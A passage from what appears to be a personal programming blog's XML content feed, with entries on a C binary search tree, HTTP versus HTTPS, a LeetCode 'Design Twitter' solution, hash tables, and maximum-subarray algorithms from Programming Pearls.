class="line"><span class="comment">/*&#x91C7;&#x7528;&#x9012;&#x5F52;&#x65B9;&#x5F0F;&#x5220;&#x9664;&#x8282;&#x70B9;*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bstree_destory_node</span><span class="params">(bstree *tree,bstree_node *root)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">bstree_destory_node(tree,root-&gt;lchild);</span><br><span class="line">bstree_destory_node(tree,root-&gt;rchild);</span><br><span class="line"><span class="built_in">free</span>(root);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*&#x4E8C;&#x53C9;&#x641C;&#x7D22;&#x6811;&#x9500;&#x6BC1;*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bstree_destory</span><span class="params">(bstree *tree)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">bstree_destory_node(tree,tree-&gt;root);</span><br><span class="line"><span class="built_in">free</span>(tree);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*&#x4E2D;&#x5E8F;&#x904D;&#x5386;&#x6253;&#x5370;&#x6811;&#x8282;&#x70B9;*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bstree_inorder_node</span><span class="params">(bstree_node *root)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">bstree_node *node = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">bstree_inorder_node(root-&gt;lchild);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; %d &quot;</span>,root-&gt;data);</span><br><span class="line">bstree_inorder_node(root-&gt;rchild);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bstree_dump</span><span class="params">(bstree *tree)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">bstree_node *node = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> ((tree == <span class="literal">NULL</span>) || (bstree_is_empty(tree)))</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\r\n &#x5F53;&#x524D;&#x6811;&#x662F;&#x7A7A;&#x6811;&quot;</span>);</span><br><span class="line">}</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\r\nSTART-----------------%d------------\r\n&quot;</span>,tree-&gt;size);</span><br><span class="line">bstree_inorder_node(tree-&gt;root);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\r\nEND---------------------------------&quot;</span>,tree-&gt;size);</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bstree_compare</span><span class="params">(mytype key1,mytype key2)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (key1 == key2)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (key1 &gt; key2)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">bstree *tree = <span class="literal">NULL</span>;</span><br><span class="line">bstree_node *node = <span class="literal">NULL</span>;</span><br><span class="line">mytype data = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">setenv(<span class="string">&quot;MALLOC_TRACE&quot;</span>,<span class="string">&quot;1.txt&quot;</span>,<span class="number">1</span>);</span><br><span class="line">    mtrace();</span><br><span class="line"></span><br><span class="line">tree = bstree_create(bstree_compare,<span class="literal">NULL</span>);</span><br><span class="line">assert(tree != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\r\n&#x63D2;&#x5165;&#x4E00;&#x4E2A;&#x6570;&#x5B57;&#xFF0C;&#x8F93;&#x5165;100&#x65F6;&#x9000;&#x51FA;&#xFF1A;&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;data);</span><br><span class="line"><span class="keyword">if</span>(data == <span class="number">100</span>)<span class="keyword">break</span>;</span><br><span class="line">res = bstree_insert(tree,data);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\r\n %d &#x63D2;&#x5165;%s&#x6210;&#x529F;&quot;</span>,data,(res != <span class="number">0</span>)?(<span class="string">&quot;&#x4E0D;&quot;</span>):(<span class="string">&quot; &quot;</span>));</span><br><span class="line">}</span><br><span class="line">bstree_dump(tree);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\r\n&#x67E5;&#x8BE2;&#x4E00;&#x4E2A;&#x6570;&#x5B57;&#xFF0C;&#x8F93;&#x5165;100&#x65F6;&#x9000;&#x51FA;&#xFF1A;&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;data);</span><br><span class="line"><span class="keyword">if</span>(data == <span class="number">100</span>)<span class="keyword">break</span>;</span><br><span class="line">node = bstree_search(tree,data);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\r\n %d %s&#x5B58;&#x5728;&#x6811;&#x4E2D;&quot;</span>,data,(node == <span class="literal">NULL</span>)?(<span class="string">&quot;&#x4E0D;&quot;</span>):(<span class="string">&quot; &quot;</span>));</span><br><span class="line">}</span><br><span class="line">bstree_dump(tree);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\r\n&#x5220;&#x9664;&#x4E00;&#x4E2A;&#x6570;&#x5B57;&#xFF0C;&#x8F93;&#x5165;100&#x65F6;&#x9000;&#x51FA;&#xFF1A;&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;data);</span><br><span class="line"><span class="keyword">if</span>(data == <span class="number">100</span>)<span class="keyword">break</span>;</span><br><span class="line">res = bstree_delete(tree,data);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\r\n %d &#x5220;&#x9664;%s&#x6210;&#x529F;&quot;</span>,data,(res != <span class="number">0</span>)?(<span class="string">&quot;&#x4E0D;&quot;</span>):(<span class="string">&quot; &quot;</span>));</span><br><span class="line">    bstree_dump(tree);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">bstree_destory(tree);</span><br><span class="line"></span><br><span class="line">    muntrace();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Http and Https</title>
      <link href="/2018/11/15/Http-and-Https/"/>
      <url>/2018/11/15/Http-and-Https/</url>
      
        <content type="html"><![CDATA[<p><img src="https://s1.ax1x.com/2018/11/16/ix6Pzj.jpg" alt=""></p><a id="more"></a><h3 id="The-difference-of-http-and-https"><a href="#The-difference-of-http-and-https" class="headerlink" title="The difference of http and https"></a>The difference of http and https</h3><p>Using HTTPS, the computers agree on a &#x201C;code&#x201D; between them, and then they scramble the messages using that &#x201C;code&#x201D; so that no one in between can read them. This keeps your information safe from hackers.</p><p>They use the &#x201C;code&#x201D; on a Secure Sockets Layer(SSL). sometimes called Transport Layer Security(TLS) to send the information back and forth.</p><h3 id="How-Does-HTTP-Work"><a href="#How-Does-HTTP-Work" class="headerlink" title="How Does HTTP Work?"></a>How Does HTTP Work?</h3><p>In the beginning, network administrators had to figure out how to share the information they put out on the Internet.</p><p>They agreed on a procedure for exchangeing information and called it Hyper Text Tranfer Protocol(HTTP).</p><p>Once everyone knew how to exchange information, intercepting on the Internet was not difficult. So knowledgeable administrators agreed upon a procedure to protect the information they exchange. The procedure relies on SSL Certificate to encrypt the online data. Encryption means that the sender and pecipient agree upon a &#x201C;code&#x201D; and translate their documents into random-looking character string.</p><p>The procedure for encrypting information and then exchangeing it is called Hyper Text Transfer Protocol Secure(HTTPS).</p><p>With HTTPS if anyone in between the sender and the recipient could open the message they still could not understand it. Only the sender and the recipient, who know the &#x201C;code&#x201D; can decipher the message.</p><p>Humans could encode their own documents, but computers do it faster and more efficiently. To do this, the computer at each end uses a document called an &#x201C;SSL Certificate&#x201D; contaning character string that are the keys to their secret &#x201C;codes&#x201D;.</p><p>SSL certificates contain the computer owner&#x2019;s &#x201C;public key&#x201D;.</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> computer network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> computer network </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>leetcode--&gt;Design Twitter</title>
      <link href="/2018/11/15/leetcode-Design-Twitter/"/>
      <url>/2018/11/15/leetcode-Design-Twitter/</url>
      
        <content type="html"><![CDATA[<p><img src="https://s1.ax1x.com/2018/11/16/ixydrq.jpg" alt=""></p><a id="more"></a><p>&#x4ECA;&#x5929;&#x5728;leetcode&#x4E0A;&#x5237;&#x9898;&#xFF0C;&#x78B0;&#x5230;&#x7684;&#x8FD9;&#x9053;&#x9898;&#x611F;&#x89C9;&#x5F88;&#x4E0D;&#x9519;&#xFF0C;&#x5C31;&#x6765;&#x6C34;&#x4E00;&#x53D1;&#x3002;</p><h3 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h3><p>Design a simplified version of Twitter where users can post tweets, follow/unfollow another user and is able to see the 10 most recent tweets in the user&#x2019;s news feed. Your design should support the following methods:</p><ul><li>postTweet(userId, tweetId): Compose a new tweet.</li><li>getNewsFeed(userId): Retrieve the 10 most recent tweet ids in the user&#x2019;s news feed. Each item in the news feed must be posted by users who the user followed or by the user herself. Tweets must be ordered from most recent to least recent.</li><li>follow(followerId, followeeId): Follower follows a followee.</li><li>unfollow(followerId, followeeId): Follower unfollows a followee.</li></ul><p>Example:</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Twitter twitter = <span class="keyword">new</span> Twitter();</span><br><span class="line"></span><br><span class="line"><span class="comment">// User 1 posts a new tweet (id = 5).</span></span><br><span class="line">twitter.postTweet(<span class="number">1</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// User 1&apos;s news feed should return a list with 1 tweet id -&gt; [5].</span></span><br><span class="line">twitter.getNewsFeed(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// User 1 follows user 2.</span></span><br><span class="line">twitter.follow(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// User 2 posts a new tweet (id = 6).</span></span><br><span class="line">twitter.postTweet(<span class="number">2</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// User 1&apos;s news feed should return a list with 2 tweet ids -&gt; [6, 5].</span></span><br><span class="line"><span class="comment">// Tweet id 6 should precede tweet id 5 because it is posted after tweet id 5.</span></span><br><span class="line">twitter.getNewsFeed(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// User 1 unfollows user 2.</span></span><br><span class="line">twitter.unfollow(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// User 1&apos;s news feed should return a list with 1 tweet id -&gt; [5],</span></span><br><span class="line"><span class="comment">// since user 1 is no longer following user 2.</span></span><br><span class="line">twitter.getNewsFeed(<span class="number">1</span>);</span><br></pre></td></tr></tbody></table></figure><h3 id="Sulation"><a href="#Sulation" class="headerlink" title="Sulation:"></a>Sulation:</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Twitter</span> {</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">P</span> {</span></span><br><span class="line">        <span class="keyword">int</span> id, ref;</span><br><span class="line">        P(<span class="keyword">int</span> i = <span class="number">0</span>, <span class="keyword">int</span> j = <span class="number">0</span>) :id(i), ref(j) {}</span><br><span class="line">        <span class="keyword">inline</span> <span class="keyword">bool</span> <span class="keyword">operator</span>&lt;(<span class="keyword">const</span> P &amp;a) <span class="keyword">const</span> {<span class="keyword">return</span> ref &gt; a.ref; }</span><br><span class="line">    };</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line">    Twitter() {</span><br><span class="line">        time = <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Compose a new tweet. */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">postTweet</span><span class="params">(<span class="keyword">int</span> userId, <span class="keyword">int</span> tweetId)</span> </span>{</span><br><span class="line">        userPost[userId].insert(P(tweetId, time++));</span><br><span class="line">        userFollow[userId].insert(userId);</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Retrieve the 10 most recent tweet ids in the user&apos;s news feed. Each item in the news feed must be posted by users who the user followed or by the user herself. Tweets must be ordered from most recent to least recent. */</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; getNewsFeed(<span class="keyword">int</span> userId) {</span><br><span class="line">        q.clear();</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;r: userFollow[userId]) {</span><br><span class="line">            <span class="keyword">int</span> n = userPost[r].size();</span><br><span class="line">            <span class="keyword">auto</span> it = userPost[r].begin();</span><br><span class="line">            n = min(n, <span class="number">10</span>);</span><br><span class="line">            <span class="keyword">while</span>(n--) {</span><br><span class="line">                <span class="keyword">if</span> (q.size() &lt; <span class="number">10</span>) {</span><br><span class="line">                    q.insert(*it++);</span><br><span class="line">                } <span class="keyword">else</span> {</span><br><span class="line">                    <span class="keyword">auto</span> c = q.end();</span><br><span class="line">                    <span class="keyword">if</span> (*it &lt; *--c) {</span><br><span class="line">                        q.erase(c);</span><br><span class="line">                        q.insert(*it++);</span><br><span class="line">                    }</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;r: q) res.push_back(r.id);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Follower follows a followee. If the operation is invalid, it should be a no-op. */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">follow</span><span class="params">(<span class="keyword">int</span> followerId, <span class="keyword">int</span> followeeId)</span> </span>{</span><br><span class="line">        userFollow[followerId].insert(followeeId);</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Follower unfollows a followee. If the operation is invalid, it should be a no-op. */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">unfollow</span><span class="params">(<span class="keyword">int</span> followerId, <span class="keyword">int</span> followeeId)</span> </span>{</span><br><span class="line">        <span class="keyword">if</span> (followerId == followeeId) <span class="keyword">return</span> ;</span><br><span class="line">        userFollow[followerId].erase(followeeId);</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line"><span class="keyword">private</span>: </span><br><span class="line">    <span class="keyword">int</span> time;</span><br><span class="line">    <span class="built_in">set</span>&lt;P&gt; q;</span><br><span class="line">    <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>, <span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt;&gt; userFollow;</span><br><span class="line">    <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>, <span class="built_in">set</span>&lt;P&gt;&gt; userPost;</span><br><span class="line">        </span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your Twitter object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * Twitter obj = new Twitter();</span></span><br><span class="line"><span class="comment"> * obj.postTweet(userId,tweetId);</span></span><br><span class="line"><span class="comment"> * vector&lt;int&gt; param_2 = obj.getNewsFeed(userId);</span></span><br><span class="line"><span class="comment"> * obj.follow(followerId,followeeId);</span></span><br><span class="line"><span class="comment"> * obj.unfollow(followerId,followeeId);</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> project </category>
          
      </categories>
      
      
        <tags>
            
            <tag> project </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hash table and Hash algorithm</title>
      <link href="/2018/11/11/Hash-table-and-Hash-algorithm/"/>
      <url>/2018/11/11/Hash-table-and-Hash-algorithm/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/resize_432360759ea2e98eb287a006cce87a9b.jpg" alt=""></p><a id="more"></a><p>Hash table:</p><p><img src="http://p4wiqzx0i.bkt.clouddn.com/%E6%95%A3%E5%88%97%E8%A1%A8.png" alt=""></p><p>Hash algorithm:</p><p><img src="http://p4wiqzx0i.bkt.clouddn.com/%E5%93%88%E5%B8%8C%E7%AE%97%E6%B3%95.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>《Programming Pearls》</title>
      <link href="/2018/11/10/%E3%80%8AProgramming-Pearls%E3%80%8B/"/>
      <url>/2018/11/10/%E3%80%8AProgramming-Pearls%E3%80%8B/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/resize_e7eb36e7dbc03dcb09bfe5c48950fcf2.jpg" alt=""></p><a id="more"></a><p>&#x7528;&#x4E86;&#x5C06;&#x8FD1;&#x4E00;&#x661F;&#x671F;&#x7684;&#x65F6;&#x95F4;&#x628A;&#x300A;&#x7F16;&#x7A0B;&#x73E0;&#x7391;&#x300B;&#x8FD9;&#x672C;&#x4E66;&#x770B;&#x5B8C;&#x4E86;&#xFF0C;&#x603B;&#x7684;&#x6765;&#x8BF4;&#x8FD8;&#x662F;&#x5B66;&#x5230;&#x4E86;&#x4E0D;&#x5C11;&#x7684;&#x4E1C;&#x897F;&#xFF0C;&#x5176;&#x4E2D;&#x8BB0;&#x5FC6;&#x6BD4;&#x8F83;&#x6DF1;&#x7684;&#x6709;&lt;&#x9519;&#x7565;&#x4F30;&#x7B97;&gt;,&lt;&#x4EE3;&#x7801;&#x8C03;&#x4F18;&gt;&#x548C;&lt;&#x5806;&gt;&#x8FD9;&#x4E09;&#x7AE0;&#x3002;</p><p><img src="http://p4wiqzx0i.bkt.clouddn.com/resize_webwxgetmsgimg.jpeg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reading </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>The technique of algorithm design</title>
      <link href="/2018/11/08/The-technique-of-algorithm-degin/"/>
      <url>/2018/11/08/The-technique-of-algorithm-degin/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/resize_f6b11c058f8fc48c0f30589367accf1c.jpg" alt=""></p><a id="more"></a><p>&#x4ECA;&#x5929;&#x5728;&#x8BFB;&#x300A;&#x7F16;&#x7A0B;&#x73E0;&#x7391;&#x300B;&lt;&#x7B97;&#x6CD5;&#x8BBE;&#x8BA1;&#x6280;&#x672F;&gt;&#x8FD9;&#x4E00;&#x7AE0;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x611F;&#x89C9;&#x5BF9;&#x81EA;&#x5DF1;&#x5E73;&#x65F6;&#x5237;OJ&#x5F88;&#x6709;&#x5E2E;&#x52A9;&#x3002;&#x603B;&#x7ED3;&#x4E00;&#x4E0B;&#xFF0C;&#x5E2E;&#x52A9;&#x81EA;&#x5DF1;&#x4EE5;&#x540E;&#x590D;&#x4E60;&#x3002;</p><h3 id="&#x95EE;&#x9898;&#x53CA;&#x7B80;&#x5355;&#x7B97;&#x6CD5;-O&#xFF08;n-3&#xFF09;"><a href="#&#x95EE;&#x9898;&#x53CA;&#x7B80;&#x5355;&#x7B97;&#x6CD5;-O&#xFF08;n-3&#xFF09;" class="headerlink" title="&#x95EE;&#x9898;&#x53CA;&#x7B80;&#x5355;&#x7B97;&#x6CD5; O&#xFF08;n^3&#xFF09;"></a>&#x95EE;&#x9898;&#x53CA;&#x7B80;&#x5355;&#x7B97;&#x6CD5; O&#xFF08;n^3&#xFF09;</h3><p><strong>&#x95EE;&#x9898;</strong>&#xFF1A; &#x6C42;&#x542B;&#x6709;n&#x4E2A;&#x5143;&#x7D20;&#x7684;&#x6570;&#x7EC4;&#x4E2D;&#x8FDE;&#x7EED;&#x5355;&#x5143;&#x7684;&#x6700;&#x5927;&#x548C;&#xFF1F;</p><p>&#x6700;&#x7B80;&#x5355;&#x7684;&#x4E00;&#x79CD;&#x7B97;&#x6CD5;&#xFF1A;<br></p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">maxsofar = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i = [<span class="number">0</span>, n)</span><br><span class="line"><span class="keyword">for</span> j = [i+<span class="number">1</span>, n)</span><br><span class="line">    sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> k = [i, j]</span><br><span class="line">        sum += x[k]</span><br><span class="line">            maxsofar = max(maxsofar, sum)</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="&#x4E24;&#x4E2A;&#x5E73;&#x65B9;&#x7B97;&#x6CD5;&#xFF08;O-n-2-&#xFF09;"><a href="#&#x4E24;&#x4E2A;&#x5E73;&#x65B9;&#x7B97;&#x6CD5;&#xFF08;O-n-2-&#xFF09;" class="headerlink" title="&#x4E24;&#x4E2A;&#x5E73;&#x65B9;&#x7B97;&#x6CD5;&#xFF08;O(n^2)&#xFF09;"></a>&#x4E24;&#x4E2A;&#x5E73;&#x65B9;&#x7B97;&#x6CD5;&#xFF08;O(n^2)&#xFF09;</h3><p>&#x6CE8;&#x610F;&#x5230; x[i&#x2026;j] &#x7684;&#x603B;&#x548C;&#x548C;&#x524D;&#x9762;&#x4EE5;&#x8BA1;&#x7B97;&#x51FA;&#x7684;&#x603B;&#x548C; x[i&#x2026;j-1] &#x5BC6;&#x5207;&#x76F8;&#x5173;&#x3002;&#x5229;&#x7528;&#x8FD9;&#x4E00;&#x70B9;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x7B97;&#x6CD5;2b&#xFF1A;<br></p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">maxsofar = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i = [<span class="number">0</span>, n)</span><br><span class="line">sum = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j = [i+<span class="number">1</span>, n)</span><br><span class="line">    sum += x[j]</span><br><span class="line">        maxsofar = max(maxsofar, sum)</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD0;&#x7528;&#x524D;&#x7F00;&#x548C;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x7C7B;&#x4F3C;&#x4E8E;&#x4E0A;&#x9762;&#x7684;&#x53E6;&#x4E00;&#x79CD;&#x7B97;&#x6CD5;&#xFF1A;<br></p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cursum[<span class="number">0</span>] = nums[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i = [<span class="number">1</span>, n)</span><br><span class="line">cursum[i] = cursum[i<span class="number">-1</span>] + x[i]</span><br><span class="line">maxsofar = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i = [<span class="number">0</span>, n)</span><br><span class="line"><span class="keyword">for</span> j = [i+<span class="number">1</span>, n)</span><br><span class="line">    sum = cursum[j] - cursum[i]</span><br><span class="line">        maxsofar = max(maxsofar, sum)</span><br></pre></td></tr></tbody></table></figure><p></p><h3 